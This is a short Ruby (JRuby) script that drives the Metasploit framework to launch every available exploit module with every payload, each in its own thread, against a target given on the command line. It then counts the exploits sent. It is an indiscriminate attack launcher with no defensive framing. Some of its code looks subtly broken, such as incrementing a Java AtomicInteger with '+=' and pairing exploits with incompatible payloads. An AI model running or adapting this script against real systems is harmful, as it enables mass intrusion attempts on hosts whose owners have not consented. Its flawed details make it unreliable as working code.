#encode: utf-8
$:.unshift(File.join(File.dirname(__FILE__), 'lib'))
require 'msf/base'
require 'pry'
require 'java'

@exploits_sent = java.util.concurrent.atomic.AtomicInteger.new

#Monkey Patching base::simple::exploit

#parameters should be passed as key=val like
#RHOST=127.0.0.1,RHORT=80, etc, etc.
if ARGV.length == 0
  puts "Usage: ./#{$0} target to be tested"
  exit 1
end
framework = Msf::Simple::Framework.create
input = Rex::Ui::Text::Input::Stdio.new
output = Rex::Ui::Text::Output::Stdio.new

puts "Exploits available: #{framework.exploits.size}"

begin
  framework.exploits.keys.each do |exploit_name|
    exploit = framework.exploits.create(exploit_name)
    exploit.framework.payloads.keys.each do |payload_name|
      #payload_name = exploit_module.first
      Thread.new do
	session = exploit.exploit_simple(
	 'Payload' =>   payload_name,
	 'OptionStr' => ARGV.join(' '),
	 'LocalInput' => input,
	 'LocalOutput' => output)
	  @exploits_sent += 1
      end
     end 
  end 
rescue
  output.print_error("Error: #{$!}\n\n#{$@.join("\n")}")
end
puts "#{@exploits_sent} exploits were sent"
